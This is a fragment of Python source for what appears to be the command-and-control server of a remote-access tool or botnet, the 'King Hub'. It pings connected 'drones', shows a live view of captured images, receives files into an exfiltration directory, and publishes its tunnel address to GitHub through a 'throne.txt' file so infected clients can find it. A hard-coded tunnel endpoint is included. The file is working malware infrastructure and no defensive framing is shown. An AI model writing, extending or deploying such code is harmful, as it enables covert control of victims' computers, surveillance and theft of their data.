            except OSError:
                break
            except Exception as e:
                print(f"[\033[91m!\033[0m] TCP accept error: {e}")
                continue

    def start_server(self) -> None:
        server_thread = threading.Thread(target=self._run_server, daemon=True)
        server_thread.start()

    def _heartbeat_loop(self) -> None:
        """Send keep-alive PING to all connected nodes every 20 seconds."""
        while self.running:
            try:
                time.sleep(20)
                with self.lock:
                    nodes = list(self.nodes.items())
                
                for client_id, conn in nodes:
                    try:
                        node_id = self.node_id_map.get(client_id, client_id)
                        self._send_message(conn, "PING\n")
                        with self.output_lock:
                            print(f"[\033[94m*\033[0m] Heartbeat PING sent to {node_id}")
                    except Exception as e:
                        with self.output_lock:
                            print(f"[\033[91m!\033[0m] Heartbeat failed for {client_id}: {e}")
                        self.remove_node(client_id)
            except Exception as e:
                print(f"[\033[91m!\033[0m] Heartbeat loop error: {e}")
                time.sleep(5)

    def start(self) -> None:
        self.start_server()
        # Start heartbeat thread
        self.heartbeat_thread = threading.Thread(target=self._heartbeat_loop, daemon=True)
        self.heartbeat_thread.start()
        print("[\033[92m+\033[0m] Heartbeat keep-alive thread started (20-second pings)")
        self.cli_loop()
        self.shutdown()

class LiveViewWindow:
    def __init__(self, image_path):
        if not TKINTER_AVAILABLE:
            print("[!] Tkinter not available for live view")
            return
        self.image_path = image_path

    def update_image(self):
        try:
            if os.path.exists(self.image_path):
                image = Image.open(self.image_path)
                # Resize if too large
                max_size = (800, 600)
                image.thumbnail(max_size, Image.Resampling.LANCZOS)
                photo = ImageTk.PhotoImage(image)
                self.label.config(image=photo)
                self.label.image = photo
        except Exception as e:
            print(f"[!] Failed to update live view: {e}")

    def check_update(self):
        self.update_image()
        self.root.after(1000, self.check_update)

    def run(self):
        self.root = tk.Tk()
        self.root.title("VincentPulse Live View")
        self.root.attributes("-topmost", True)  # Always on top
        self.label = tk.Label(self.root)
        self.label.pack()
        self.update_image()
        self.root.after(1000, self.check_update)
        self.root.mainloop()

def _format_bytes(count: int) -> str:
    if count < 1024:
        return f"{count} B"
    for unit in ['KB', 'MB', 'GB', 'TB']:
        count /= 1024.0
        if count < 1024.0:
            return f"{count:.2f} {unit}"
    return f"{count:.2f} PB"


def update_github_throne() -> bool:
    """Update throne.txt file with the manual tunnel address and push to GitHub."""
    try:
        # Check if throne.txt already has the correct content
        try:
            with open('throne.txt', 'r') as f:
                current_content = f.read().strip()
            if current_content == PUBLIC_URL:
                print(f'[\033[92m+\033[0m] Throne already up to date: {PUBLIC_URL}')
                # Verify port
                if ':7229' in PUBLIC_URL:
                    print(f'[\033[92m+\033[0m] ✓ Port 7229 confirmed in throne.txt')
                return True
        except FileNotFoundError:
            pass

        # Write PUBLIC_URL to throne.txt
        with open('throne.txt', 'w') as f:
            f.write(PUBLIC_URL)
        print(f'[\033[92m+\033[0m] Throne.txt written with address: {PUBLIC_URL}')
        
        # Verify port in written file
        if ':7229' in PUBLIC_URL:
            print(f'[\033[92m+\033[0m] ✓ Port 7229 confirmed in throne.txt')

        try:
            # Perform git add
            subprocess.run(['git', 'add', 'throne.txt'], capture_output=True, timeout=10, check=True)

            # Check if there are changes to commit
            result = subprocess.run(['git', 'diff', '--cached', '--name-only'], capture_output=True, timeout=10, text=True)
            if not result.stdout.strip():
                print(f'[\033[92m+\033[0m] No changes to commit, throne already up to date: {PUBLIC_URL}')
                return True

            # Perform git commit
            subprocess.run(['git', 'commit', '-m', 'Update Throne Address'], capture_output=True, timeout=10, check=True)

            # Determine the current branch and remote
            branch_result = subprocess.run(['git', 'branch', '--show-current'], capture_output=True, timeout=10, text=True)
            branch = branch_result.stdout.strip() or 'main'
            remote_result = subprocess.run(['git', 'remote'], capture_output=True, timeout=10, text=True)
            remotes = [line.strip() for line in remote_result.stdout.splitlines() if line.strip()]
            if remotes:
                push_cmd = ['git', 'push', remotes[0], f'HEAD:{branch}']
            else:
                push_cmd = ['git', 'push']

            subprocess.run(push_cmd, capture_output=True, timeout=20, check=True)

            print(f'[\033[92m+\033[0m] Throne updated and pushed to GitHub: {PUBLIC_URL}')
            print(f'[\033[92m+\033[0m] ✓ Auto-evolution enabled for drones')
            return True
        except subprocess.CalledProcessError as e:
            # Git operation failed, but throne.txt was written successfully
            print(f'[\033[93m~\033[0m] Throne file written locally (git sync skipped): {PUBLIC_URL}')
            return True
        except FileNotFoundError:
            # Git not installed, but throne.txt was written
            print(f'[\033[93m~\033[0m] Throne file written locally (git not available): {PUBLIC_URL}')
            return True
    except Exception as e:
        print(f'[\033[91m!\033[0m] Error updating throne: {e}')
        return False


def _recv_exact(conn, initial_data, size, timeout=30.0):
        """The high-precision binary receiver."""
        data = initial_data
        start_time = time.time()
        # MAGIC_FOOTER is 'V_PULSE_EOF' (11 bytes)
        total_expected = size + 11 
        
        conn.settimeout(1.0)
        while len(data) < total_expected:
            if time.time() - start_time > timeout:
                return None, b''
            try:
                chunk = conn.recv(min(8192, total_expected - len(data)))
                if not chunk: break
                data += chunk
            except:
                continue

        # --- THIS IS THE SECTION FOR LINE 663 ---
        # We check if the data ends with our 11-byte magic string
        if len(data) >= total_expected:
            actual_footer = data[size:size+11]
            if actual_footer == b"V_PULSE_EOF":
                return data[:size], data[total_expected:]
        
        return None, b''

def _normalize_destination(destination: str) -> str:
    destination = destination.strip().splitlines()[0].strip()
    for prefix in ('http://', 'https://', 'tcp://', 'ssh://'):
        if destination.lower().startswith(prefix):
            destination = destination[len(prefix):]
            break
    destination = destination.rstrip('/')
    if ':' in destination:
        host, port = destination.split(':', 1)
        host = host.strip()
        port = port.strip()
        if host and port.isdigit():
            return f"{host}:{port}"
    return destination





def _print_startup_banner(host: str, port: int, exfil_dir: str) -> None:
    """Print the King Hub status board on startup."""
    print("\n")
    print("[*] KING HUB STATUS: ACTIVE")
    print("[*] TUNNEL TYPE: External App (Manual)")
    print(f"[*] PUBLIC ENDPOINT: {PUBLIC_URL}")
    print(f"[*] LOCAL PORT: {port}")
    print("[*] GITHUB: throne.txt updated and pushed.")
    print("\n")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Command hub for remote nodes')
    parser.add_argument('--host', default='0.0.0.0', help='Host to bind the hub')
    parser.add_argument('--port', type=int, default=9999, help='Port to bind the hub')
    args = parser.parse_args()

    hub = CommandHub(host=args.host, port=args.port)
    hub.start_server()
    time.sleep(1)

    # Automatically update GitHub throne on startup
    update_github_throne()
    
    # Print the King Hub status board
    print("\n")
    print("[*] KING HUB STATUS: ACTIVE")
    print("[*] App Tunnel Active | Drones Routing to: ufazduoqpe.localto.net:7229")
    print(f"[*] LOCAL PORT: {args.port}")
    print("[*] GITHUB: throne.txt updated and pushed.")
    print("\n")
    
    try:
        print("\n")
        print("[\033[92m+\033[0m] " + "="*60)
        print("[\033[92m+\033[0m] KING HUB ACTIVE")
        print(f"[\033[92m+\033[0m] King is at: {PUBLIC_URL}")
        print("[\033[92m+\033[0m] " + "="*60)
        print("\n")
        hub.cli_loop()
    finally:
        hub.shutdown()
